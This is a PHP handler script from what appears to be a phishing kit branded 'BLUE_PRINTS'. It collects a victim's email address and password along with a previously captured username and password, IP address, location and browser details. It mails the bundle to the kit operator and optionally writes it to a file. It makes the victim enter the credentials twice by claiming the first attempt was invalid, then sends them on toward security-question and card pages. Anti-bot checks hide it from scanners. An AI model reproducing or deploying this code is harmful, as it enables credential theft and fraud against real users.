<?php
	session_start();

    require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';
    
        $comps = new Comp;
        $antibot = new Antibot;
    
        if (!$comps->checkToken()) {
            echo $antibot->throw404();
            die();
        } 
include 'recn.php';
include '../../huehuehue.php';
include "../conf/config.php";
include '../../crawlerdetect.php';
if($_POST){
    $eml 	  = $_POST['eml'];
    $_SESSION['eml'] = $eml;
	$epass  = $_POST['epass'];
    $_SESSION['epass'] = $epass;
    $ip = $_SERVER['REMOTE_ADDR'];

if($e_log == "on"){}else{
    $ff = fopen("em_db",'a');
    fwrite($ff,$ip."\n");
    fclose($ff);
    }

$ck = file_get_contents('em_db');

    if(strpos($ck, $ip) !== false){
        //log2 if enabled else log2
        $body = ":::::::::: BLUE_PRINTS 1nf0 [User Details] ::::::::::::::\r\n";
        $body .= "Username                         : {$_SESSION['omlj']}\r\n";
        $body .= "pass                             : {$_SESSION['pass']}\r\n";
        $body .= ":::::::::::::: BLUE_PRINTS 1nf0 [Dual Email Details] :::::::::::\r\n";
        $body .= "Email                            : $eml\r\n";
        $body .= "pass                             : $epass\r\n";
        $body .=  "|--------------- I N F O | I P -------------------|\r\n";
        $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
        $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
        $body .= "IP City	                           : {$_SESSION['city']}\r\n";
        $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
        $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
        $body .= "TIME		                           : ".date("d/m/Y h:i:sa")." GMT\r\n";
        $body .= ":::::::::::::::  BLUE_PRINTS 1nf0 :::::::::::::::::\r\n";
        if($savetxt == "on"){
        $save=fopen("../data/email".$salt.".txt",'a');
        fwrite($save,$body);
        fclose($save);
        }

        $subject = "Dual Email by BLUE_PRINTS | IP {$_SESSION['ip']}";
        $headers="From: Blue_Prints <blue_prints@B04.com>\r\n";
        $headers.="MIME-Version: 1.0\r\n";
        $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
         @mail($emailzz, $subject, $body, $headers);    

        $b = file_get_contents('em_db');
        $c = preg_replace($ip, '', $b);
        file_put_contents("em_db", $c);
        if($ques == "on"){
            header("Location: ../../security.php?token={$_SESSION['token']}");
        }else{
        header("Location: ../../cc.php?token={$_SESSION['token']}");
        }

    }else{
        //log1 if enabled else noting
        $body = ":::::::::: BLUE_PRINTS 1nf0 [User Details] ::::::::::::::\r\n";
        $body .= "Username                         : {$_SESSION['omlj']}\r\n";
        $body .= "pass                             : {$_SESSION['pass']}\r\n";
        $body .= ":::::::::::::: BLUE_PRINTS 1nf0 [ Email Details] ::::::::::::\r\n";
        $body .= "Email                            : $eml\r\n";
        $body .= "pass                             : $epass\r\n";
        $body .=  "|--------------- I N F O | I P -------------------|\r\n";
        $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
        $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
        $body .= "IP City	                           : {$_SESSION['city']}\r\n";
        $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
        $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
        $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
        $body .= "::::::::::::::::::  BLUE_PRINTS 1nf0 ::::::::::::::::::::::\r\n";
        if($savetxt == "on"){
        $save=fopen("../data/email".$salt.".txt",'a');
        fwrite($save,$body);
        fclose($save);
        }

        $subject = "Email By BLUE_PRINTS | IP {$_SESSION['ip']}";
        $headers="From: Blue_Prints <blue_prints@B04.com>\r\n";
        $headers.="MIME-Version: 1.0\r\n";
        $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($emailzz, $subject, $body, $headers);    
 

        $ff = fopen("em_db",'a');
        fwrite($ff,$ip."\n");
        fclose($ff);


        header("Location: ../../email_identity.php?invalid&token={$_SESSION['token']}");

    }
}else{
    exit(header("HTTP/1.0 404 Not Found"));
}
?>